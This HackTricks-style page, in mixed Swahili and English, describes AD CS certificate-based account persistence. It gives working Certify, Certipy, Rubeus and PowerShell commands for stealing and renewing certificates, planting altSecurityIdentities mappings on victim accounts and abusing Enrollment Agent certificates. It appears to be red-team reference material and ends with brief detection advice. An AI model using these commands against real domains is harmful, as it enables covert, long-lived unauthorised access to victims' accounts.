# AD CS Account Persistence

{{#include ../../../banners/hacktricks-training.md}}

**Hii ni muhtasari mfupi wa sura za account persistence kutoka kwenye utafiti mzuri sana wa [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)**

## Understanding Active User Credential Theft with Certificates – PERSIST1

Katika hali ambapo certificate inayoruhusu domain authentication inaweza kuombwa na user, mshambuliaji ana nafasi ya kuomba na kuiba certificate hii ili kudumisha persistence kwenye network. Kwa chaguo-msingi, template ya `User` kwenye Active Directory huruhusu maombi kama haya, ingawa wakati mwingine inaweza kuwa imezimwa.

Kwa kutumia [Certify](https://github.com/GhostPack/Certify) au [Certipy](https://github.com/ly4k/Certipy), unaweza kutafuta enabled templates zinazoruhusu client authentication kisha uombe moja:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Newer Certify 2.0 syntax with filtering to enabled client-auth templates
Certify.exe enum-templates --filter-enabled --filter-client-auth --hide-admins

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
Nguvu ya cheti iko katika uwezo wake wa kujithibitisha kama mtumiaji ambaye kinamhusu, bila kujali mabadiliko ya nenosiri, mradi tu cheti kinasalia kuwa halali.

Unaweza kubadilisha PEM kuwa PFX na kuitumia kupata TGT:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> Kumbuka: Imeunganishwa na mbinu nyingine (tazama sehemu za THEFT), uthibitishaji unaotegemea certificate huruhusu ufikiaji wa kudumu bila kugusa LSASS na hata kutoka kwenye mazingira yasiyo na elevation.

## Kupata Uendelevu wa Machine kwa kutumia Certificates - PERSIST2

Ikiwa mshambuliaji ana privileges zilizoinuliwa kwenye host, anaweza kusajili machine account ya mfumo ulioathiriwa kwa certificate kwa kutumia `Machine` template ya kawaida. Kujithibitisha kama machine huwezesha S4U2Self kwa local services na kunaweza kutoa host persistence ya kudumu:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local\theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## Kupanua Uendelevu Kupitia Upyaaji wa Cheti - PERSIST3

Kutumia vibaya vipindi vya uhalali na upyaaji vya certificate templates humruhusu mshambuliaji kudumisha ufikiaji wa muda mrefu. Ikiwa unamiliki certificate iliyotolewa awali na private key yake, unaweza kuisahihisha kabla ya kuisha muda wake ili kupata credential mpya, ya muda mrefu bila kuacha request artifacts za ziada zilizounganishwa na principal ya awali.
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> Kidokezo cha kiutendaji: Fuatilia muda wa uhai wa faili za PFX zinazoshikiliwa na attacker na zisashe mapema. Uhuishaji pia unaweza kusababisha certificates zilizosasishwa zijumuishe extension ya kisasa ya SID mapping, zikizifanya ziendelee kutumika chini ya sheria kali zaidi za DC mapping (tazama sehemu inayofuata).

## Planting Explicit Certificate Mappings (altSecurityIdentities) – PERSIST4

Ikiwa unaweza kuandika kwenye attribute ya `altSecurityIdentities` ya account lengwa, unaweza ku-map kwa uwazi certificate inayodhibitiwa na attacker kwenda kwenye account hiyo. Hii huendelea kuwepo hata baada ya password changes na, unapotumia strong mapping formats, hubaki ikifanya kazi chini ya modern DC enforcement.

Mtiririko wa juu kwa juu:

1. Pata au toa client-auth certificate unayodhibiti (kwa mfano, enroll `User` template kama wewe mwenyewe).
2. Toa identifier yenye nguvu kutoka kwenye cert (Issuer+Serial, SKI, au SHA1-PublicKey).
3. Ongeza explicit mapping kwenye `altSecurityIdentities` ya principal ya mwathirika kwa kutumia identifier hiyo.
4. Authenticate kwa kutumia certificate yako; DC hui-map hadi mwathirika kupitia explicit mapping.

Mfano (PowerShell) unaotumia strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Kisha authenticate na PFX yako. Certipy itapata TGT moja kwa moja:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### Kujenga `altSecurityIdentities` strong mappings

Kwa vitendo, **Issuer+Serial** na **SKI** mappings ndizo strong formats rahisi zaidi kujenga kutoka kwa certificate iliyo mikononi mwa mshambuliaji. Hii ni muhimu baada ya **February 11, 2025**, wakati DCs zinapowekwa kwa chaguo-msingi kuwa **Full Enforcement** na weak mappings zinaacha kuwa za kuaminika.
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
Notes
- Gunia aina imara za mapping pekee: `X509IssuerSerialNumber`, `X509SKI`, au `X509SHA1PublicKey`. Format dhaifu (Subject/Issuer, Subject-only, RFC822 email) zimepitwa na wakati na zinaweza kuzuiwa na sera ya DC.
- Mapping hufanya kazi kwenye **user** na **computer** objects, kwa hiyo write access kwenye `altSecurityIdentities` ya computer account inatosha kuendelea kuwa kama machine hiyo.
- Cert chain lazima ijengeke hadi root inayoaminika na DC. Enterprise CAs katika NTAuth kwa kawaida zinaaminika; baadhi ya mazingira pia huamini public CAs.
- Schannel authentication bado ni muhimu kwa persistence hata PKINIT ikishindwa kwa sababu DC haina Smart Card Logon EKU au hurudisha `KDC_ERR_PADATA_TYPE_NOSUPP`.

#### 2025+ `Issuer/SID` explicit mappings

Kwenye domain controllers za **Windows Server 2022+** zilizopatchiwa update ya usalama ya **September 9, 2025**, Microsoft iliongeza format nyingine imara ya explicit mapping ambayo inavutia kwa persistence kwa sababu huendelea kufanya kazi hata cert ikitolewa upya kutoka CA hiyo hiyo:
```powershell
# Same issuer formatting rules as Issuer+Serial
$Issuer = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SID    = 'S-1-5-21-1111111111-2222222222-3333333333-1105'
$Map    = "X509:<I>$Issuer<SID>$SID"
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
Kiuendeshaji, hii inatofautiana na fomati za zamani zenye nguvu:
- `Issuer+Serial` hufunga **cheti kimoja mahususi kabisa**.
- `SKI` / `SHA1-PUKEY` hufunga **keypair moja**.
- `Issuer/SID` hufunga **CA inayotoa + SID lengwa**, hivyo vyeti vilivyofanywa upya au kutolewa tena kutoka kwa CA hiyo hiyo vinaendelea kufanya kazi bila kuandika upya `altSecurityIdentities`.

Mahitaji na tahadhari
- Cheti kilichowasilishwa kwa ajili ya logon lazima kiwe na SID ya akaunti lengwa kweli ndani ya SID security extension.
- Fomati hii haisaidii kwa vyeti vya mtindo wa `ESC9` / `ESC16` vinavyoondoa SID extension; katika hali hizo rudi kwenye `Issuer+Serial`, `SKI`, au `SHA1-PUKEY`.

Kwa zaidi kuhusu weak explicit mappings na attack paths, tazama:


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent as Persistence – PERSIST5

Ukipata cheti halali cha Certificate Request Agent/Enrollment Agent, unaweza kuunda vyeti vipya vinavyoweza kutumika kwa logon kwa niaba ya watumiaji wakati wowote na kuweka agent PFX nje ya mtandao kama persistence token. Abuse workflow:
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
Uondoaji wa cheti cha agent au ruhusa za template unahitajika ili kuondoa persistence hii.

Operational notes
- Matoleo ya kisasa ya `Certipy` yanaunga mkono `-on-behalf-of` na `-renew`, kwa hivyo mshambuliaji akiwa na Enrollment Agent PFX anaweza kutengeneza na baadaye kufanya renew ya leaf certificates bila kugusa tena akaunti asili ya lengo.
- Ikiwa upatikanaji wa TGT unaotegemea PKINIT hauwezekani, certificate ya on-behalf-of inayopatikana bado inaweza kutumika kwa Schannel authentication na `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## Using Persisted Certificates When PKINIT Fails

Ikiwa DC haina cheti kinachoweza Smart Card Logon, certificate logon kupitia PKINIT inaweza kushindwa kwa `KDC_ERR_PADATA_TYPE_NOSUPP`. Hilo haliuui primitive ya persistence: mara nyingi PFX hiyo hiyo bado inaweza kutumika kwa LDAP access iliyothibitishwa na Schannel.
```bash
# LDAPS / Schannel shell as the mapped principal
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell

# LDAP StartTLS fallback if 636 is filtered but 389/TLS is reachable
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell -ldap-scheme ldap -ldap-port 389
```
Hii ni muhimu hasa baada ya PERSIST4/PERSIST5 kwa sababu unaweza kuendelea kufanya kazi kutoka Linux/macOS na kuunganisha vitendo vingine vya persistence vya directory kama vile kuweka [shadow credentials](../acl-persistence-abuse/shadow-credentials.md) au kuhariri writable delegation attributes.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 ilianzisha Strong Certificate Mapping Enforcement kwenye domain controllers. Tangu **February 11, 2025**, DCs kwa chaguo-msingi hutumia **Full Enforcement** kwa weak/ambiguous mappings, na kufikia sasisho la usalama la **September 9, 2025** DCs zilizopatchwa haziauni tena fallback ya zamani ya Compatibility-mode. Athari za vitendo:

- Certificates za kabla ya 2022 ambazo hazina SID mapping extension zinaweza kushindwa implicit mapping wakati DCs ziko katika Full Enforcement. Wavamizi wanaweza kudumisha access kwa ama ku-renew certificates kupitia AD CS (ili kupata SID extension) au kwa kuweka strong explicit mapping katika `altSecurityIdentities` (PERSIST4).
- Explicit mappings zinazotumia strong formats (`Issuer+Serial`, `SKI`, `SHA1-PUKEY`, na kwenye modern DCs `Issuer/SID`) zinaendelea kufanya kazi. Weak formats (Issuer/Subject, Subject-only, RFC822) zinaweza kuzuiwa na zinapaswa kuepukwa kwa persistence.
- Ikiwa weak mappings bado zinaonekana kufanya kazi, chukulia kwamba umepata unpatched au tofauti configured DC badala ya long-term persistence path ya kuaminika.
- `ESC9` / `ESC16` style issuance paths zinazokandamiza SID extension hufanya `Issuer/SID` isitumike, kwa hiyo fallback strong mappings au renewal kupitia normal template huwa ndio practical persistence option.

Administrators wanapaswa kufuatilia na kutoa alert kwa:
- Mabadiliko kwenye `altSecurityIdentities` na issuance/renewals za Enrollment Agent na User certificates.
- CA issuance logs kwa on-behalf-of requests na renewal patterns zisizo za kawaida.

## References

- [Microsoft Support – KB5014754: Certificate-based authentication changes on Windows domain controllers](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)
- [SpecterOps – ADCS ESC14 Abuse Technique](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/)
- [GhostPack/Certify Wiki – Account Persistence Techniques](https://github.com/GhostPack/Certify/wiki/2-%E2%80%90-Account-Persistence-Techniques)
- [Certipy Wiki – Command Reference](https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference)
- [Almond Offensive Security – Authenticating with certificates when PKINIT is not supported](https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html)
- [Microsoft Community Hub – Introducing a new Issuer/SID AltSecID](https://techcommunity.microsoft.com/blog/publicsectorblog/introducing-a-new-issuersid-altsecid/4454231)

{{#include ../../../banners/hacktricks-training.md}}
